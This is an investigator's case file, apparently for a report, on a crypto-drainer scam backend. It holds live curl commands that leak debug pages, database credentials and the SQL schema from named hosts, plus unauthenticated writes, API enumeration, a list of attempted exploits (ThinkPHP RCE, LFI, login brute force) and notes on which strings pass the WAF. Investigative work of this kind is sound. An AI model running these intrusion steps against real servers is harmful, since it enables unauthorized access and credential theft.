# 盗U / drainer 白标后台：「无签名能力」的判定（waifa 案，2026-09-29）

> 用途：**回答「私钥呢」这类问题**。目标是把「找不到」升级成报告级负面结论，并阻止下一轮继续
> 在「拿私钥」上投弹药。三路证据：API 方法枚举 + 源码窗读出的函数体 + 链上取证。

## 目标形状

```
admin.waifa.lat  154.23.175.61   内网 10.0.4.2
admin.waifa.mom  154.23.175.241  内网 10.0.4.3
Nginx 1.26.1 + 宝塔免费版 WAF + FastAdmin(ThinkPHP 5.0.28) + PHP-FPM
APP_DEBUG = 1
端口 22 / 80 / 443 / 888(phpMyAdmin,全403) / 8888(全404)
```

同机三站（vhost 枚举，均无 CF）：

- `admin.<域>` / `backend.<域>` → 「授权管理」FastAdmin 后台
- `www.waifa.lat` / `app.gasa-vip.com` → **"Bogoroch USDT DApp"** 钱包授权盗U前台（Vue3）
- `gasa-vip.com` → **假冒 GASA（全球反诈联盟）** 站点（1.8MB Vue3，12 语言）

## 情报链（全部免鉴权或低权）

### 1) 前台 SPA → 后端地址

```bash
curl -sk -H 'Host: www.waifa.lat' 'https://154.23.175.61/assets/index-<hash>.js' \
  | grep -oE 'https://[^"]+' | grep -i waifa
# => https://admin.waifa.lat/api     (axios baseURL)
```

前台路由名即功能表：`/chain-selection` `/wallet-selection` `/wallet-connect-token`
`/eth-wallet-connect-token` `/bep20-wallet-connect-token` `/sol-wallet-connect-token` `/token-recovery`。
API 层：`/index/getConfig` `/index/tokenRecovery` `/contract/recordTronWalletConnect`
`/contract/updateAuthStatus`。多语言（中英德日法意荷西葡）= 规模化投放。

### 2) `getConfig` 未授权 → 全链收款基础设施

```bash
curl -sk https://admin.waifa.lat/api/index/getConfig
```

回 12 字段：`{trc20,erc20,bep20,sol}_{token,contract,authorized}_address`。
**`.lat` 与 `.mom` 是两套不同的 contract/authorized 地址 ⇒ 多操盘手分账**（报告里分开列，别合并成一套）。

### 3) `APP_DEBUG=1` → 未捕获异常 → 环境变量

```bash
curl -sk -X POST https://admin.waifa.lat/api/index/tokenRecovery \
  -H 'Content-Type: application/json' -d '{"recoveryType":"trc20"}'
# 缺 submit_time → ErrorException，调试页整页 $_SERVER
```

拿到 `PHP_DATABASE_{HOSTNAME,DATABASE,USERNAME,PASSWORD,HOSTPORT,PREFIX}` —— 本案
**库名 = 用户名 = 口令**（`waifa.lat` / `waifa.lat`）、`SERVER_ADDR` 内网 IP、`ROOT_PATH`、
`THINK_VERSION=5.0.28`、`DOCUMENT_ROOT=/www/wwwroot/admin.waifa.lat/public`。

### 4) PDO 数值超范围 → 表名 + 全列 + DB Config + 绝对路径（一次到手）

应用层 validate 先挡超长（顺带免费给出列宽）：

```
description长度不能超过 1000 / platformName…100 / cryptoAddress…255 / phoneNumber…20
```

但**数值列不在 validate 里**：

```bash
curl -sk -X POST https://admin.waifa.mom/api/index/tokenRecovery \
  -d 'recoveryType=trc20&platformName=t&platformLink=https://t.com&assetType=USDT&blockchainNetwork=trc20&cryptoAddress=T001&amountLost=-99999999999999999999999999&proofOfOwnership=t&assetLocation=t&phoneNumber=<PHONE-REDACTED>&description=t&submit_time=2026-09-29 17:00:00'
```

回 `object(think\exception\PDOException)#19` 的 **var_dump**（不是 HTML 调试页），含：

```
Error SQL: INSERT INTO `fa_token_recovery` (`recovery_type` , `platform_name` , … , `submit_time`)
           VALUES ('trc20' , 't' , … )
Database Config: {database:"waifa.mom", hostname:"127.0.0.1", prefix:"fa_", charset:"utf8mb4", … 23 项}
1264 Out of range value for column 'amount_lost' at row 1
调用栈: think\db\Query::insertGetId ← application/api/controller/Index.php:106
```

### 5) 未授权写

```
POST /api/contract/recordTronWalletConnect  {"wallet_address":"…"}              → code:1 记录成功
POST /api/contract/updateAuthStatus         {"wallet_address":"…","auth_status":1} → code:1
```

### 6) 调试页源码窗（PHP warning → ErrorException，±9 行）

`wallet_address[]=x` → `strtolower() expects parameter 1 to be string, array given`
→ 吐 `application/common.php` **547–565 行**：

```php
549|  $res = @file_get_contents($url, false, stream_context_create($opts));
551|  $logToDisk($method ?: 'GET', $url, $payload ?: 'GET_METHOD', $res ?: 'EMPTY');
556|  $addr = strtolower($wallet_address);
559|  if ($chain_type === 'ERC20' || ($chain_type === null && strpos($addr,'0x')===0)) {
561|      $ethUrl = "https://1rpc.io/eth";
562|      $usdtEth = '0x65b1Df6d5F84A0e6731A3fB9Eaf9aE7881c2F678';
564|      $eRes = $make_request($ethUrl, 'eth_getBalance', [$addr, 'latest']);
565|      $eth = isset($eRes['result']) ? bcdiv(hexdec($eRes['result']),'1000000000000000000',4) : '0';
```

调用栈一并给出 **`get_token_balance()` in `Contract.php:123`** ⇒ **该函数只读余额，无签名逻辑**。

## 方法枚举（catch-all 401 必须先解除）

```python
# 不带票：整控制器恒同一个 401，连不存在的方法也一样（零信息量）
GET /api/contract/zzz_noexist                          -> {"code":401,"msg":"请登录后操作"}

# 放上自助注册来的普通用户 token：立刻变成干净预言机
GET /api/contract/recordTronWalletConnect {"token": <低权token>} -> 业务 JSON（存在）
GET /api/contract/withdraw                {"token": <低权token>} -> nginx 404（不存在）
```

104 个候选（`withdraw / withdrawToken / withdrawAll / drain / sweep / collect / harvest /
pull / take / claim / cashout / transfer / sendTx / sign / signTx / broadcast / execute /
invoke / doWithdraw / autoWithdraw / tokenWithdraw / moveToken / getPrivateKey / getKey /
secret / approve / revoke / buildTx / withdrawList / …`）**全部 nginx 404**。

控制器级同法（每控制器试多个方法名，任一回 JSON 即控制器存在）：只有
`index / user / common / demo / contract` 五个，**无 `wallet`/`sign`/`tx`/`chain`/`crypto` 控制器**。

## 链上取证

```bash
# 合约 ABI / 元数据
curl -s -X POST https://api.trongrid.io/wallet/getcontract \
  -H 'Content-Type: application/json' -d '{"value":"<合约>","visible":true}'
# 读 customOwner()（只读常驻调用，不广播）
curl -s -X POST https://api.trongrid.io/wallet/triggerconstantcontract \
  -H 'Content-Type: application/json' \
  -d '{"owner_address":"<任意外部地址>","contract_address":"<合约>","function_selector":"customOwner()","parameter":"","visible":true}'
```

```
恶意合约 TM61ybFn3fXycA282UTnB3imt1KSsspcEs
  交易数 0 / 余额 0 / USDT 授权 0 笔                             ← 从未被使用
  ABI: customOwner() [view] / transfer(address,address,address,uint256) / withdrawToken(address)
  customOwner() -> TBxPyyE9pczRCcmihSaVeY5QgyKUkW5gSr            ← 正是 getConfig 的 trc20_authorized_address
  owner 地址历史交易仅 2 笔（充 TRX 手续费 + 部署合约）
```

## 判定

三路证据一致 ⇒ **后端只做受害者线索采集 + 余额侦察（判断「哪条鱼肥」），无私钥、无签名能力**；
盗币由操盘手用**离线钱包手动调 `withdrawToken`**。这是刻意的运营安全设计：
**web 全打穿也拿不到资金**。数据库里即便存在 `*_private_key` 配置项，本代码库也无任何位置读它。

`fa_token_recovery`（受害者线索库，凭 §4 的 SQL 泄露还原全列）：

```
recovery_type / platform_name / platform_link / asset_type / blockchain_network /
crypto_address / amount_lost(decimal) / proof_of_ownership / asset_location /
phone_number / description / submit_time
```

字段语义 = 假「资产恢复」申请：钱包地址 + 损失金额 + 手机号 + 平台链接。读该表需后台登录。

## 判死面（本案实测，避免重复投弹药）

| 面 | 结果 |
|---|---|
| TP5 `_method=__construct` / `invokefunction` RCE | 5.0.28 已修（5.0.24 起）+ WAF 拦关键词 |
| 直接传 `.php` | WAF 拦 multipart 文件名里的 `.php`（断连） |
| 分片上传路径穿越 | 服务端回 `未开启分片上传功能` |
| phar 反序列化 | WAF 拦 `__HALT_COMPILER` / `<?php` |
| `ajax/lang` LFI | 恒回 `define({"errmsg":"参数错误"});`（34B），未进入文件包含 |
| `php://filter` / 任意文件读 | WAF 拦 `php://`（大小写不敏感） |
| SQLi | 全参数化：`'`/`"` 写入无异常；数组参数被 validate/类型闸挡 |
| PATH_INFO / 路径归一化绕过 admin 模块 | 框架 `deny_module_list` + 路径全 404 |
| 后台入口爆破（1243 候选名） | 已改随机文件名，未命中 |
| admin 口令 | API 登录 3 发后 `Please try again after 1 day` |
| MySQL 直连 | 全端口扫描仅 22/80/443/888/8888；3306 仅 127.0.0.1 |
| SSH 口令复用（DB 口令试 root/www） | 失败 |

## 宝塔免费版 WAF 放行/拦截面（无害探针映射）

| 探针值 | 结果 |
|---|---|
| `lang=/etc/passwd` | 403 WAF 页（1322B「宝塔网站防火墙免费版」） |
| `lang=/www/wwwroot` | **放行** |
| `lang=../`（单个） | **放行** |
| `lang=../../../../etc/passwd` | 拦（因命中 `/etc/passwd`） |
| `lang=php://` / `PHP://` / `Php://` / `php:/` | 拦 |
| `lang=php:` | 放行 |
| body 里 `.php`（`savekey=/uploads/x.php`） | 拦（断连） |
| 非法 UTF-8 字节（`%FF%FE`） | 拦（断连） |

⇒ **别写「WAF 拦路径穿越」**：它拦的是**敏感串**（`/etc/passwd` 一类），单个 `../` 与
`/www/wwwroot` 都能过 —— 找绕过要找「哪一段串」触发，而不是「拦 `../` 就绕不过」。

**封禁表现 = TCP 443 仍 open 但 HTTPS 连接被重置**（`curl` → `000` + `RemoteDisconnected`，
而 `bash -c 'echo > /dev/tcp/<ip>/443'` 成功）—— 别写成「服务器挂了」。

## 未闭环（记下来，别当已验证）

- FastAdmin `savekey` 覆盖落盘路径 + `%2E` 编码绕 WAF：**未获确认**。
- 出口：本机默认 `HTTPS_PROXY=socks5h://127.0.0.1:9050`，`curl --noproxy '*'` 与走 Tor 是
  **两个出口**，两边可能各自被封；排查时分别用 `api.ipify.org` 记 IP 再下判。
